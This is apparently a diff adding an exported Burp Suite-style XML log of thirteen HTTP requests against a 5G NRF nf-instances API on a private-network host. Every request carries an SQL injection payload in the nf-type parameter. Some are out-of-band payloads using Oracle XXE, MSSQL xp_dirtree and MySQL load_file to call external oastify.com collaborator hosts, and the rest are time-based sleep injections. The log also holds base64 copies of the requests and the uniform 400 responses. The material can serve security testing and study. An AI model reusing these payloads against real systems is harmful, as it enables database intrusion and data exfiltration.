@@ -1,0 +1,210 @@
+<items exportTime="Sun Feb 19 13:04:19 CET 2023">
+  <item>
+    <time>Sun Feb 19 12:50:50 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dxtre%20SYSTEM%20%22http%3a%2f%2fne55u7klph2p49kpr2fjfn481z7qbe124qvdl1a.oasti'%7c%7c'fy.com%2f%22%3e%25dxtre%3b]%3e')%2c'%2fl')%20from%20dual)&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dxtre%20SYSTEM%20%22http%3a%2f%2fne55u7klph2p49kpr2fjfn481z7qbe124qvdl1a.oasti'%7c%7c'fy.com%2f%22%3e%25dxtre%3b]%3e')%2c'%2fl')%20from%20dual)&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0oc2VsZWN0JTIwZXh0cmFjdHZhbHVlKHhtbHR5cGUoJyUzYyUzZnhtbCUyMHZlcnNpb24lM2QlMjIxLjAlMjIlMjBlbmNvZGluZyUzZCUyMlVURi04JTIyJTNmJTNlJTNjIURPQ1RZUEUlMjByb290JTIwWyUyMCUzYyFFTlRJVFklMjAlMjUlMjBkeHRyZSUyMFNZU1RFTSUyMCUyMmh0dHAlM2ElMmYlMmZuZTU1dTdrbHBoMnA0OWtwcjJmamZuNDgxejdxYmUxMjRxdmRsMWEub2FzdGknJTdjJTdjJ2Z5LmNvbSUyZiUyMiUzZSUyNWR4dHJlJTNiXSUzZScpJTJjJyUyZmwnKSUyMGZyb20lMjBkdWFsKSZsaW1pdD0gSFRUUC8xLjENCkhvc3Q6IDE5Mi4xNjguNzAuMTMwDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6OTAuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85MC4wDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24NCg0K]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:50:51 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type='%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dxtre%20SYSTEM%20%22http%3a%2f%2f9mwr2ts7x3abcvsbzon5n9cu9lfcj09odc4zunj.oasti'%7c%7c'fy.com%2f%22%3e%25dxtre%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type='%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20dxtre%20SYSTEM%20%22http%3a%2f%2f9mwr2ts7x3abcvsbzon5n9cu9lfcj09odc4zunj.oasti'%7c%7c'fy.com%2f%22%3e%25dxtre%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0nJTdjJTdjKHNlbGVjdCUyMGV4dHJhY3R2YWx1ZSh4bWx0eXBlKCclM2MlM2Z4bWwlMjB2ZXJzaW9uJTNkJTIyMS4wJTIyJTIwZW5jb2RpbmclM2QlMjJVVEYtOCUyMiUzZiUzZSUzYyFET0NUWVBFJTIwcm9vdCUyMFslMjAlM2MhRU5USVRZJTIwJTI1JTIwZHh0cmUlMjBTWVNURU0lMjAlMjJodHRwJTNhJTJmJTJmOW13cjJ0czd4M2FiY3ZzYnpvbjVuOWN1OWxmY2owOW9kYzR6dW5qLm9hc3RpJyU3YyU3YydmeS5jb20lMmYlMjIlM2UlMjVkeHRyZSUzYl0lM2UnKSUyYyclMmZsJyklMjBmcm9tJTIwZHVhbCklN2MlN2MnJmxpbWl0PSBIVFRQLzEuMQ0KSG9zdDogMTkyLjE2OC43MC4xMzANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjo5MC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzkwLjANCkFjY2VwdDogYXBwbGljYXRpb24vanNvbg0KDQo=]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:50:52 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type=%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cm8v4o6ekjgwoy8eol19i9my7vy1p5dv1mraix8lx.oasti'%2b'fy.com%5cxnx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type=%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cm8v4o6ekjgwoy8eol19i9my7vy1p5dv1mraix8lx.oasti'%2b'fy.com%5cxnx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0lM2JkZWNsYXJlJTIwQHElMjB2YXJjaGFyKDk5KSUzYnNldCUyMEBxJTNkJyU1YyU1Y204djRvNmVramd3b3k4ZW9sMTlpOW15N3Z5MXA1ZHYxbXJhaXg4bHgub2FzdGknJTJiJ2Z5LmNvbSU1Y3hueCclM2IlMjBleGVjJTIwbWFzdGVyLmRiby54cF9kaXJ0cmVlJTIwQHElM2ItLSUyMCZsaW1pdD0gSFRUUC8xLjENCkhvc3Q6IDE5Mi4xNjguNzAuMTMwDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6OTAuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85MC4wDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24NCg0K]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:50:53 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type='%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cx20fih8vdrqzsj8zfc3t3xsip9v0zopcg34urkf9.oasti'%2b'fy.com%5cplm'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type='%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cx20fih8vdrqzsj8zfc3t3xsip9v0zopcg34urkf9.oasti'%2b'fy.com%5cplm'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0nJTNiZGVjbGFyZSUyMEBxJTIwdmFyY2hhcig5OSklM2JzZXQlMjBAcSUzZCclNWMlNWN4MjBmaWg4dmRycXpzajh6ZmMzdDN4c2lwOXYwem9wY2czNHVya2Y5Lm9hc3RpJyUyYidmeS5jb20lNWNwbG0nJTNiJTIwZXhlYyUyMG1hc3Rlci5kYm8ueHBfZGlydHJlZSUyMEBxJTNiLS0lMjAmbGltaXQ9IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjcwLjEzMA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjkwLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTAuMA0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uDQoNCg==]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:50:54 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type=)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cwiieygoutq6y8ioyvbjsjw8h58bzfn5bw3ku7kv9.oasti'%2b'fy.com%5cimx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type=)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cwiieygoutq6y8ioyvbjsjw8h58bzfn5bw3ku7kv9.oasti'%2b'fy.com%5cimx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0pJTNiZGVjbGFyZSUyMEBxJTIwdmFyY2hhcig5OSklM2JzZXQlMjBAcSUzZCclNWMlNWN3aWlleWdvdXRxNnk4aW95dmJqc2p3OGg1OGJ6Zm41Yncza3U3a3Y5Lm9hc3RpJyUyYidmeS5jb20lNWNpbXgnJTNiJTIwZXhlYyUyMG1hc3Rlci5kYm8ueHBfZGlydHJlZSUyMEBxJTNiLS0lMjAmbGltaXQ9IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjcwLjEzMA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjkwLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTAuMA0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uDQoNCg==]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:50:55 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type=')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ca0bsgu68b4ocqw6cdp161aqvnmtdx1npei29pzdo.oasti'%2b'fy.com%5cvfg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type=')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ca0bsgu68b4ocqw6cdp161aqvnmtdx1npei29pzdo.oasti'%2b'fy.com%5cvfg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0nKSUzYmRlY2xhcmUlMjBAcSUyMHZhcmNoYXIoOTkpJTNic2V0JTIwQHElM2QnJTVjJTVjYTBic2d1NjhiNG9jcXc2Y2RwMTYxYXF2bm10ZHgxbnBlaTI5cHpkby5vYXN0aSclMmInZnkuY29tJTVjdmZnJyUzYiUyMGV4ZWMlMjBtYXN0ZXIuZGJvLnhwX2RpcnRyZWUlMjBAcSUzYi0tJTIwJmxpbWl0PSBIVFRQLzEuMQ0KSG9zdDogMTkyLjE2OC43MC4xMzANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjo5MC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzkwLjANCkFjY2VwdDogYXBwbGljYXRpb24vanNvbg0KDQo=]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:50:56 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type=(select%20load_file('%5c%5c%5c%5c2svk8my03wg4ioy45htyt2infel5ptfh6juah05p.oastify.com%5c%5clpt'))&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type=(select%20load_file('%5c%5c%5c%5c2svk8my03wg4ioy45htyt2infel5ptfh6juah05p.oastify.com%5c%5clpt'))&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0oc2VsZWN0JTIwbG9hZF9maWxlKCclNWMlNWMlNWMlNWMyc3ZrOG15MDN3ZzRpb3k0NWh0eXQyaW5mZWw1cHRmaDZqdWFoMDVwLm9hc3RpZnkuY29tJTVjJTVjbHB0JykpJmxpbWl0PSBIVFRQLzEuMQ0KSG9zdDogMTkyLjE2OC43MC4xMzANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjo5MC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzkwLjANCkFjY2VwdDogYXBwbGljYXRpb24vanNvbg0KDQo=]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:50:57 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type='%2b(select%20load_file('%5c%5c%5c%5cxhifxhnvsr5z7jnzucitix7i49a0eo4cvfj66wul.oastify.com%5c%5cedk'))%2b'&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type='%2b(select%20load_file('%5c%5c%5c%5cxhifxhnvsr5z7jnzucitix7i49a0eo4cvfj66wul.oastify.com%5c%5cedk'))%2b'&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0nJTJiKHNlbGVjdCUyMGxvYWRfZmlsZSgnJTVjJTVjJTVjJTVjeGhpZnhobnZzcjV6N2puenVjaXRpeDdpNDlhMGVvNGN2Zmo2Nnd1bC5vYXN0aWZ5LmNvbSU1YyU1Y2VkaycpKSUyYicmbGltaXQ9IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjcwLjEzMA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjkwLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTAuMA0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uDQoNCg==]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:50:58 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type='&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type='&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0nJmxpbWl0PSBIVFRQLzEuMQ0KSG9zdDogMTkyLjE2OC43MC4xMzANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjo5MC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzkwLjANCkFjY2VwdDogYXBwbGljYXRpb24vanNvbg0KDQo=]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:50:59 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type='(select*from(select(sleep(20)))a)'&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type='(select*from(select(sleep(20)))a)'&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0nKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJyZsaW1pdD0gSFRUUC8xLjENCkhvc3Q6IDE5Mi4xNjguNzAuMTMwDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6OTAuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85MC4wDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24NCg0K]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:51:00 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type='%2b(select*from(select(sleep(20)))a)%2b'&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type='%2b(select*from(select(sleep(20)))a)%2b'&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0nJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJyZsaW1pdD0gSFRUUC8xLjENCkhvc3Q6IDE5Mi4xNjguNzAuMTMwDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6OTAuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC85MC4wDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24NCg0K]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:51:01 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type='%20and%20(select*from(select(sleep(20)))a)--%20&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type='%20and%20(select*from(select(sleep(20)))a)--%20&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0nJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjAmbGltaXQ9IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjcwLjEzMA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjkwLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTAuMA0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uDQoNCg==]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:51:02 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances?nf-type=%2c(select*from(select(sleep(20)))a)&limit=]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances?nf-type=%2c(select*from(select(sleep(20)))a)&limit=]]></path>
+    <extension>null</extension>
+    <request base64="true"><![CDATA[R0VUIC9ubnJmLW5mbS92MS9uZi1pbnN0YW5jZXM/bmYtdHlwZT0lMmMoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkmbGltaXQ9IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjcwLjEzMA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjkwLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTAuMA0KQWNjZXB0OiBhcHBsaWNhdGlvbi9qc29uDQoNCg==]]></request>
+    <status>400</status>
+    <responselength>141</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3Byb2JsZW0ranNvbg0KQ29ubmVjdGlvbjogQ2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNA0KDQp7ImNhdXNlIjoiTUFOREFUT1JZX0lFX0lOQ09SUkVDVCJ9]]></response>
+    <comment></comment>
+  </item>
+</items>
